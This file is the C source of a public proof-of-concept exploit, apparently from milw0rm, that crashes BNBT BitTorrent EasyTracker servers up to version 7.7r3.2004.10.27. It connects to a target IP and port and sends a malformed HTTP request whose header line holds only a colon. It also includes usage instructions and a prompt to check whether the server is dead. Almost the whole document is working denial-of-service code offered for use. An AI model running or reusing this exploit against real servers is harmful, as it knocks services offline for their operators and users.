/* BNBT BitTorrent EasyTracker Remote Denial Of Service
   
   Versions:
   Version 7.7r3.2004.10.27 and below
  
   Vendors:
   http://bnbt.go-dedicated.com/
   http://bnbteasytracker.sourceforge.net/
   http://sourceforge.net/projects/bnbtusermods/

   Bug find and coded by:
   Sowhat@@secway@org
   http://secway.org

   This PoC will Crash the server.
 */

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char exploit[] = 

"GET /index.htm HTTP/1.0\r\n:\r\n\r\n";

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersionRequested;
	struct hostent  *pTarget;
	struct sockaddr_in 	sock;
	char *target;
	int port,bufsize;
	SOCKET mysocket;
	
	if (argc < 2)
	{
		printf(" ######################################################################\r\n");
		printf(" #   BNBT BitTorrent EasyTracker DoS by sowhat <sowhat@@secway@org>   #\r\n", argv[0]);
		printf(" #          This exploit will Crash the Server                        #\r\n");
		printf(" #               http://www.secway.org                                #\r\n");		
		printf(" ######################################################################\r\n");
		printf(" Usage:\r\n %s <targetip> [targetport] (default is 6969)	\r\n", argv[0]);
		printf(" Example:\r\n");
		printf("	%s 1.1.1.1\r\n",argv[0]);
		printf("	%s 1.1.1.1 8888\r\n",argv[0]);
		exit(1);
	}

	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

	target = argv[1];
	port = 6969;

	if (argc >= 3) port = atoi(argv[2]);
	bufsize = 1024;
	if (argc >= 4) bufsize = atoi(argv[3]);

	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	if(mysocket==INVALID_SOCKET)
	{	
		printf("Socket error!\r\n");
		exit(1);
	}

	printf("Resolving Hostnames...\n");
	if ((pTarget = gethostbyname(target)) == NULL)
	{
		printf("Resolve of %s failed\n", argv[1]);
		exit(1);
	}

	memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons((USHORT)port);

	printf("Connecting...\n");
	if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
	{
		printf("Couldn't connect to host.\n");
		exit(1);
	}

	printf("Connected!...\n");
	printf("Sending Payload...\n");
	if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)
	{
		printf("Error Sending the Exploit Payload\r\n");
		closesocket(mysocket);
		exit(1);
	}

	printf("Payload has been sent! Check if the webserver is dead.\r\n");
	closesocket(mysocket);
	WSACleanup();
	return 0;
}

// milw0rm.com [2005-09-06]